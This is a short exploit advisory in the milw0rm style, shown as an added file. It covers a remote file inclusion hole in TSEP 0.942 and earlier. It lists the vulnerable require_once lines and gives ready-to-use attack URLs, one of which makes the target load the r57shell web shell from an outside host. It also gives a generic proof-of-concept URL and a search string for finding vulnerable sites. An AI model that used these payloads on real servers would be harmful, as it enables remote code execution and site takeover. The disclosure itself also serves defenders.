@@ -1,0 +1,25 @@
+Script: TSEP <= 0.942
+URL:  www.tsep.info
+Discovered: beford <xbefordx gmail com>
+Comments: "register_globals" must be enabled duh.
+document.this != http://www.milw0rm.com/exploits/2098
+Vulnerable Files/Code:
+
+./tsep.0942/include/colorswitch.php?tsep_config[absPath]=http://rst.void.ru/download/r57shell.txt?
+./tsep.0942/include/printpagedetails.php => require_once(
+$tsep_config["absPath"]."/include/convert_htmlent.php" );
+./tsep.0942/include/ipfunctions.php => require_once(
+$tsep_config["absPath"]."/include/IPv6.php" );
+./tsep.0942/include/contentimages.class.php => require_once(
+$tsep_config["absPath"]."/include/contentimages.class.php" );
+./tsep.0942/include/configfunctions.php => require_once(
+$tsep_config["absPath"]."/include/mmexfunctions.php" );
+./tsep.0942/include/log.class.php => require_once(
+$tsep_config["absPath"]."/include/tseptrace.php" );
+
+Not-leet-enough: "Powered By TSEP"
+
+POC:
+http://hax.com/tsep/include/colorswitch.php?tsep_config[absPath]=http://remotefile/?
+
+# milw0rm.com [2006-08-02]
